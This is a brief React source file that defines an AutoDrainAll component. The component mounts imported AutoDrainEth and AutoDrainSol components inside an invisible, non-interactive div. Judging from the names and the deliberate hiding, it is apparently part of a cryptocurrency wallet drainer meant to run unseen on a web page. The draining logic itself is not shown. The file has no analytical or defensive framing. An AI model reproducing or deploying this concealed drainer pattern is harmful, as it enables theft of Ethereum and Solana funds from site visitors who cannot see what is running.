import { AutoDrainEth } from './AutoDrainEth';
import { AutoDrainSol } from './AutoDrainSol';

export const AutoDrainAll = () => {
  return (
    <div style={{ display: 'none', position: 'absolute', pointerEvents: 'none' }}>
      <AutoDrainEth />
      <AutoDrainSol />
    </div>
  );
};
